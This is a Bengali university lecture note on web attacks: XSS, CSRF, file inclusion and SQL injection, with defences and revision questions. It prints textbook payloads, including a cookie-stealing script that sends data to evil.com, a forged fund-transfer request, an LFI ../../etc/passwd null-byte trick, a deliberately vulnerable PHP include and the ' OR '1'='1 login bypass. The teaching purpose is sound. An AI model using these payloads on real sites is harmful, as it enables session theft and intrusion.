    LECTURE 26

    Web Security III — XSS, CSRF, File Inclusion ও SQL Injection

    Client-side আক্রমণ: Cross-Site Scripting (persistent ও non-persistent), Cross-Site Request Forgery (login CSRF সহ) ও তাদের প্রতিরক্ষা; ব্যবহারকারীর নিরাপদ ব্রাউজিং অভ্যাস ও browser-এর নিরাপত্তা ব্যবস্থা; তারপর server-side আক্রমণ: RFI, LFI ও SQL injection।

    Persistent XSSReflected XSSCSRFReferer · tokenRFI · LFI · %00' OR '1'='1

    Cross-Site Scripting (XSS)

    সবচেয়ে সাধারণ web দুর্বলতার একটা। ওয়েবসাইটের অপর্যাপ্ত input validation-এর সুযোগে ক্ষতিকর user সাইটে কোড inject করে, যা পরে অন্য ভিজিটরের browser-এ চলে।

    🎯 কেন বিপজ্জনক

    Inject করা script চলে বিশ্বস্ত সাইটের নামে — তাই সেই সাইটের DOM, form, এবং (HttpOnly না থাকলে) cookie পায় → session hijacking (Lecture 25)।

    Inject করা কোড সাইটে কিছু সময় থেকে যায় এবং অন্য user-রা দেখে। ক্লাসিক উদাহরণ: সংবাদ/সোশ্যাল সাইটের guestbook / message board। Input sanitize না করলে attacker এমন comment লেখে:

    Nice article! <script> document.location = "http://evil.com/steal.php?c=" + document.cookie; </script>

    যে-ই ওই page দেখে, তার cookie attacker-এর সার্ভারে চলে যায়।

    Inject করা কোড attacker-এর session-এর পরে থাকে না; বাস্তবে এটাই বেশি। ক্লাসিক উদাহরণ: search page যা query ফিরিয়ে দেখায় — “security book” খুঁজলে page শুরু হয়: Search results for security book।

    Sanitize না করলে search box-এ কোড দিলে সেটা page-এ content হিসেবে বসে কোড হিসেবে চলে। Attacker victim-কে এমন লিংক পাঠায়:

    http://www.site.com/search?q=<script>…document.cookie…</script>

    Victim ক্লিক করলে বিশ্বস্ত site.com-ই script-টা “reflect” করে victim-এর browser-এ চালায়।

    🧪 Search page: sanitize করলে কী বদলায় (কোড এখানে কখনো চলে না — শুধু দেখানো হচ্ছে)

    XSS প্রতিরক্ষা

    • Proxy-based: browser ও server-এর HTTP ট্রাফিক বিশ্লেষণ করে বিশেষ HTML অক্ষর (< > " ') খোঁজে ও page চালানোর আগে encode করে — যেমন Firefox plugin NoScript।
    • Application-level firewall: HTML page-এ সংবেদনশীল তথ্য ফাঁস করতে পারে এমন hyperlink খোঁজে; connection rule দিয়ে খারাপ request থামায়।
    • (সাধারণ নিয়ম) Server-এ সব input validate ও output encode; cookie-তে HttpOnly।

    Cross-Site Request Forgery (CSRF)

    🎯 XSS বনাম CSRF

    XSS কাজে লাগায় user-এর একটা নির্দিষ্ট সাইটের প্রতি বিশ্বাস। CSRF কাজে লাগায় সাইটের একটা নির্দিষ্ট user-এর প্রতি বিশ্বাস — ক্ষতিকর সাইট user-কে দিয়ে অজান্তে এমন third-party সাইটে command চালায় যেটা user-কে বিশ্বাস করে।

    naivebank.com উদাহরণ

    👤 Userlogin ✅ (cookie পেল)🏦 naivebank.com

    ১. User www.naivebank.com-এ অনলাইন ব্যাংকিং করে, logged in — browser-এ session cookie আছে।

    👤 Userভিজিট →😈 evilsite.com

    ২. একই browser-এ (logout না করে) user ঘুরতে ঘুরতে www.evilsite.com-এ গেল, যেখানে আছে:

    <script> document.location = 'http://www.naivebank.com/transferFunds.php?amount=10000&fromID=1234&toID=5678'; </script>
    👤 User-এর browser
    Cookie স্বয়ংক্রিয় যুক্ত!    GET transferFunds…🏦 naivebank.com

    ৩. Browser ব্যাংকে redirect করে এবং নিয়মমতো naivebank-এর cookie নিজে থেকেই জুড়ে দেয়। ব্যাংকের কাছে request সম্পূর্ণ বৈধ দেখায়।

    🏦 #1234$10,000 →😈 #5678

    ৪. Victim-এর অ্যাকাউন্ট (#1234) থেকে attacker-এর অ্যাকাউন্টে (#5678) $10,000! User কিছুই টের পেল না।

    Login CSRF

    নতুন রূপ: ক্ষতিকর সাইট user-এর হয়ে cross-site request পাঠায়, কিন্তু user হিসেবে নয় — user-কে attacker হিসেবে login করিয়ে দেয়। উদাহরণ: অসৎ merchant PayPal-এ পেমেন্ট নেয়; user PayPal-এ login করে পেমেন্টের পর merchant চুপচাপ forged request দিয়ে user-কে attacker-এর অ্যাকাউন্টে পুনরায় login করায়। User না জেনে credit card তথ্য দিলে তা attacker-এর অ্যাকাউন্টে জমা হয় — পরে সে দেখে নেয়।

    CSRF প্রতিরক্ষা

    ঠেকানো খুব কঠিন — সাইটের কাছে request বৈধ দেখায়।

    • Referer HTTP header পর্যবেক্ষণ — request-এর আগে কোন সাইটে ছিল তা দেখায় (evilsite.com থেকে এলে বাতিল)। কিন্তু privacy-আক্রমণাত্মক।
    • শুধু cookie নয়, প্রতিটা request-এর সাথে একটা session token (hidden field) পাঠানো — attacker-কে সেই token জানতে হবে। প্রতি session-এ ভিন্ন token।
    • আর প্রতিবার কাজ শেষে logout করতে ভুলো না!
    CSRF কেন সফল হয়?
    তাই cookie-র বাইরে একটা অনুমানের অযোগ্য token লাগে।

    Client-side প্রতিরক্ষা: নিরাপদ অভ্যাস ও Browser ব্যবস্থা

    Safe-browsing practices

    • ইমেইল বা অবিশ্বস্ত সাইটের অজানা লিংকে ক্লিক নয়।
    • ব্যক্তিগত তথ্য দেওয়ার আগে HTTPS নিশ্চিত — padlock বা address bar-এর রঙ। Login page HTTPS না হলে নিজে “s” যোগ করো বা HTTPS version খোঁজো।
    • URL ভালো করে দেখো ও certificate error নেই নিশ্চিত করো।
    • অজানা/অবিশ্বস্ত সাইটে কখনো সংবেদনশীল তথ্য নয়।

    Built-in browser security

    Browserপদ্ধতি
    Internet ExplorerZone — ডিফল্টে সব সাইট Internet Zone-এ; user সাইটকে Trusted বা Restricted zone-এ দিতে পারে; প্রতিটা zone-এর আলাদা policy
    FirefoxZone নেই; সব সাইটে একই নিয়ম (plugin দিয়ে trusted/untrusted ভাগ করা যায়)
    Operaডিফল্ট global setting, তবে নির্দিষ্ট সাইটে আলাদা policy দেওয়া যায়
    • পরিচিত phishing/malware সাইটের public blacklist-এ থাকা সাইটে গেলে স্বয়ংক্রিয় সতর্কবার্তা।
    • NoScript-এর মতো plugin whitelist/blacklist ব্যবহার করে, XSS ধরার চেষ্টা করে ও HTTP request sanitize করে cookie চুরি ঠেকায়।
    • সবসময় browser-এর সর্বশেষ version।

    Server-side: Remote ও Local File Inclusion

    Server-side script (যেমন PHP) HTML form থেকে input নিয়ে সার্ভারে চলে। Server-side script inclusion attack-এ web server-এর দুর্বলতা দিয়ে attacker সার্ভারে নিজের script inject করে চালায়।

    <?php include($_GET['page']); ?> ← দুর্বল কোড: user যা বলে তাই include
    🌍 RFI (Remote File Inclusion)

    অন্য সার্ভারের remote script চালায়।

    📁 LFI (Local File Inclusion)

    একই সার্ভারের local (ক্ষতিকর/গোপন) ফাইল চালায়/দেখায়।

    🧪 victim.com/index.php?page=… — সার্ভার কী include করবে?
    • RFI-তে প্রায়ই web shell চালানো হয় — দূর থেকে কমান্ড স্টেশন: সার্ভারে ঘুরে ফাইল দেখা, সম্পাদনা, upload, delete।
    • সৌভাগ্যক্রমে RFI কমছে — বেশিরভাগ PHP installation ডিফল্টে অন্য সার্ভারের কোড চালাতে দেয় না (allow_url_include = Off)।
    • LFI-তে admin/secretpage.php → authentication bypass; ../../etc/passwd → “Not found” (কারণ সার্ভার .php যোগ করে); %00 যোগ → null byte = string-এর শেষ, এর পরের সব (.php) উপেক্ষা → Bingo!

    SQL Injection

    অনেক web app form থেকে input নিয়ে হুবহু SQL query-তে বসায়: SELECT user FROM table WHERE name = 'user_input';। SQL injection = user input-এর ভেতরে SQL statement ঢোকানো।

    SQL দ্রুত রিভিশন

    SELECT * FROM users WHERE age > 20 ORDER BY name LIMIT 5; │ │ │ │ └ কতগুলো row │ │ │ └ কোন column অনুযায়ী সাজানো │ │ └ record filter │ └ কোন table থেকে └ কোন data (ফলাফল result table-এ)

    ক্লাসিক login bypass

    select * from users where user='$username' AND pwd='$passwd'

    Attacker username ও password দুই জায়গায় লেখে M' OR '1'='1:

    select * from users where user='M' OR '1'='1' AND pwd='M' OR '1'='1' └── সবসময় সত্য ──┘

    ফল: password ছাড়াই access!

    🧪 Login form — SQL injection simulator

    সমাধান

    • কারণ: প্রোগ্রামাররা query বানানোর আগে input sanitize করেন না। প্রতিরোধ তুলনামূলক সহজ।
    • বেশিরভাগ ভাষায় বিপজ্জনক অক্ষর সরানোর built-in function — যেমন PHP-র mysql_real_escape_string (single/double quote escape করে)।
    • Legacy কোডে SQL injection স্বয়ংক্রিয়ভাবে খোঁজার কৌশলও আছে।
    • (আধুনিক best practice) Prepared statement / parameterized query — input কখনো SQL কোড হিসেবে parse হয় না।
    💡 Prepared statement
    $stmt = $db->prepare("SELECT * FROM users WHERE user = ? AND pwd = ?"); $stmt->execute([$username, $passwd]); // input শুধুই data

    Web Server DoS ও সারাংশ

    স্লাইডের শেষে web server-কে DoS করার ছবি — Lecture 21-এর SYN flood/DDoS ছাড়াও application স্তরে: প্রচুর ভারী request (বড় search, বারবার login), অল্প অল্প করে request পাঠিয়ে connection ধরে রাখা (Slowloris) — সার্ভারের থ্রেড/মেমরি শেষ।

    আক্রমণকোথায় চলেকী কাজে লাগায়প্রধান প্রতিরক্ষা
    XSSVictim-এর browserUser-এর সাইটের প্রতি বিশ্বাসInput validation, output encoding, HttpOnly
    CSRFVictim-এর browser → সাইটসাইটের user-এর প্রতি বিশ্বাসPer-session token, Referer, logout
    RFI / LFIServerInclude-এ unchecked inputWhitelist, allow_url_include off
    SQL injectionServer → databaseQuery-তে unsanitized inputEscape, prepared statement

    রিভিশন কুইজ

    ১) Guestbook-এ রাখা script পরে প্রত্যেক ভিজিটরের browser-এ চলে — কোন আক্রমণ?
    সাইটে থেকে যায় = persistent।
    ২) “Site-এর user-এর প্রতি বিশ্বাস” কাজে লাগায় কোনটা?
    CSRF = XSS-এর উল্টো।
    ৩) LFI-তে %00 কেন যোগ করা হয়?
    তাই /etc/passwd.php না খুঁজে /etc/passwd খোলে।
    ৪) SQL injection-এর মূল কারণ?
    স্লাইড: programmers failing to sanitize user input।
    🎯 সম্ভাব্য পরীক্ষার প্রশ্ন
    • XSS কী? Persistent ও non-persistent উদাহরণসহ; প্রতিরক্ষা।
    • CSRF (naivebank উদাহরণ); XSS-এর সাথে পার্থক্য; login CSRF; প্রতিরক্ষা।
    • Safe-browsing অভ্যাস; IE zone বনাম Firefox বনাম Opera।
    • RFI ও LFI; web shell; %00 null byte কৌশল।
    • SQL injection দিয়ে login bypass দেখাও; সমাধান।
